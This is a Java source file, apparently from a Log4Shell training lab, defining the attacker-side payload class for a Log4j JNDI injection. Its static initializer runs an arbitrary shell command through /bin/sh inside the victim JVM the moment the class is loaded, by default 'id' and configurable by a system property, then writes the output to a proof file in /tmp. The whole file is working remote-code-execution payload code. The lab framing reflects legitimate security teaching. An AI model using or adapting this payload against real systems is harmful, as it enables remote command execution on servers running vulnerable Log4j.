package lab;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

/**
 * Attacker payload. Its static initializer executes in the *victim* JVM the moment the
 * class is loaded by JNDI (from the attacker's codebase URL, or from the local classpath).
 * That is the remote code execution primitive.
 */
public final class Payload implements ObjectFactory {

    /** Proof file written from the victim process. */
    public static final String PROOF = System.getProperty("lab.proof", "/tmp/log4j-lab-pwned.txt");

    static {
        final String cmd = System.getProperty("lab.cmd", "id");
        final StringBuilder out = new StringBuilder();
        try {
            final Process p = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});
            final BufferedReader r =
                    new BufferedReader(new InputStreamReader(p.getInputStream(), Charset.forName("UTF-8")));
            String line;
            while ((line = r.readLine()) != null) {
                out.append(line).append('\n');
            }
            p.waitFor();
        } catch (Throwable t) {
            out.append("payload error: ").append(t).append('\n');
        }
        final String proof = "RCE via log4j JNDI in " + ManagementFactory.getRuntimeMXBean().getName()
                + "\ncmd: " + cmd
                + "\noutput:\n" + out;
        try {
            Files.write(Paths.get(PROOF), proof.getBytes(Charset.forName("UTF-8")));
        } catch (Throwable ignored) {
            // proof file is best effort
        }
        System.out.println("=== PAYLOAD EXECUTED IN VICTIM JVM ===");
        System.out.print(proof);
        System.out.println("=== END PAYLOAD ===");
    }

    @Override
    public Object getObjectInstance(final Object obj, final Name name, final Context ctx, final Hashtable<?, ?> env) {
        return "pwned";
    }
}
